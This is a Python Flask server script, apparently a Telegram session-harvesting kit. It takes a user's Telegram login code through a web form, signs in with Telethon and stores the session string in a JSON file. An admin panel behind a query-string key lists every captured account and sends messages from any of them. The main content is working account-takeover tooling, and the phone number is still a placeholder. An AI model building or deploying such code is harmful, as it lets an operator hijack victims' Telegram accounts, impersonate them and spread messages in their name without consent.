from flask import Flask, request, jsonify, send_from_directory
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
import asyncio
import json
import os

app = Flask(__name__, static_folder='.')

# ⚙️ CONFIG
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
SECRET_KEY = os.getenv('SECRET_KEY', 'your_admin_key_here')

ACCOUNTS_FILE = 'accounts.json'
if not os.path.exists(ACCOUNTS_FILE):
    with open(ACCOUNTS_FILE, 'w') as f:
        json.dump({}, f)

def load_accounts():
    with open(ACCOUNTS_FILE, 'r') as f:
        return json.load(f)

def save_accounts(data):
    with open(ACCOUNTS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

# 📞 OTP Request
@app.route('/request_otp', methods=['POST'])
def request_otp():
    data = request.json
    user_id = str(data['user_id'])
    phone = "+8801XXXXXXXX"  # ⚠️ REPLACE WITH REAL INPUT LATER

    async def send_code():
        client = TelegramClient(f"sessions/{user_id}", API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            result = await client.send_code_request(phone)
            accounts = load_accounts()
            accounts[user_id] = {
                "phone": phone,
                "phone_code_hash": result.phone_code_hash,
                "session_string": "",
                "status": "awaiting_otp"
            }
            save_accounts(accounts)
        await client.disconnect()

    try:
        asyncio.run(send_code())
        return jsonify({"success": True})
    except Exception as e:
        print(e)
        return jsonify({"success": False, "error": str(e)})

# 🔑 OTP Verify
@app.route('/verify_otp', methods=['POST'])
def verify_otp():
    data = request.json
    user_id = str(data['user_id'])
    otp = data['otp']

    accounts = load_accounts()
    if user_id not in accounts:
        return jsonify({"success": False, "error": "No OTP requested"})

    phone = accounts[user_id]["phone"]
    phone_code_hash = accounts[user_id]["phone_code_hash"]

    async def sign_in():
        client = TelegramClient(f"sessions/{user_id}", API_ID, API_HASH)
        await client.connect()
        try:
            await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
            string = StringSession.save(client.session)
            accounts[user_id]["session_string"] = string
            accounts[user_id]["status"] = "active"
            save_accounts(accounts)
            await client.disconnect()
            return True
        except Exception as e:
            await client.disconnect()
            raise e

    try:
        success = asyncio.run(sign_in())
        return jsonify({"success": success})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

# 👑 Admin Panel
@app.route('/admin')
def admin_panel():
    key = request.args.get('key')
    if key != SECRET_KEY:
        return "❌ Access Denied", 403
    return send_from_directory('.', 'admin.html')

# 📡 Get All Accounts
@app.route('/api/accounts')
def api_accounts():
    key = request.args.get('key')
    if key != SECRET_KEY:
        return jsonify([]), 403
    return jsonify(load_accounts())

# 📩 Send Message API
@app.route('/api/send_message', methods=['POST'])
def api_send_message():
    key = request.args.get('key')
    if key != SECRET_KEY:
        return jsonify({"error": "Unauthorized"}), 403

    data = request.json
    user_id = data['user_id']
    to = data['to']
    message = data['message']

    accounts = load_accounts()
    if user_id not in accounts or not accounts[user_id].get('session_string'):
        return jsonify({"error": "Account not active"}), 400

    async def send_msg():
        session_str = accounts[user_id]['session_string']
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            return False
        await client.send_message(to, message)
        await client.disconnect()
        return True

    try:
        sent = asyncio.run(send_msg())
        return jsonify({"success": sent})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ✅ SERVE FRONTEND FILES
@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

@app.route('/<path:path>')
def static_files(path):
    if os.path.exists(path):
        return send_from_directory('.', path)
    else:
        return send_from_directory('.', 'index.html')  # Fallback for SPA

if __name__ == '__main__':
    os.makedirs('sessions', exist_ok=True)
    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 8080)))
